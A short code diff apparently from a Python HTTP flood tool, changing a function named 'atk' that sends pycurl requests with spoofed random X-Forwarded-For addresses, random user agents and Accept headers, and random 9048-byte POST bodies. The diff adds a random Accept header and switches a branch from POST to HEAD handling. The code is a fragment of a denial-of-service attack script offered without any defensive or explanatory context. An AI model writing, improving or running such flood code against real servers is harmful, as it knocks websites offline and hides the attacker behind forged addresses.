@@ -147,6 +147,7 @@ def atk(a, b, c):
 		curl.setopt(pycurl.CUSTOMREQUEST, b)
 		curl.setopt(pycurl.URL, a.encode("UTF-8"))
 		curl.setopt(pycurl.HTTPHEADER, [
+			'' + random.choice(acceptall),
 			'X-Forwarded-For:'+str(random.randint(1,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))])
 		curl.setopt(pycurl.USERAGENT, random.choice(useragents))
 		curl.setopt(pycurl.WRITEDATA, by)
@@ -154,7 +155,7 @@ def atk(a, b, c):
 			ps = random._urandom(9048)
 			curl.setopt(pycurl.READDATA, StringIO(str(ps)))
 			curl.setopt(pycurl.POSTFIELDSIZE, len(ps))
-		elif b.lower() == "post":
+		elif b.lower() == "head":
 			curl.setopt(pycurl.NOBODY, 1)
 		try:
 			curl.perform()
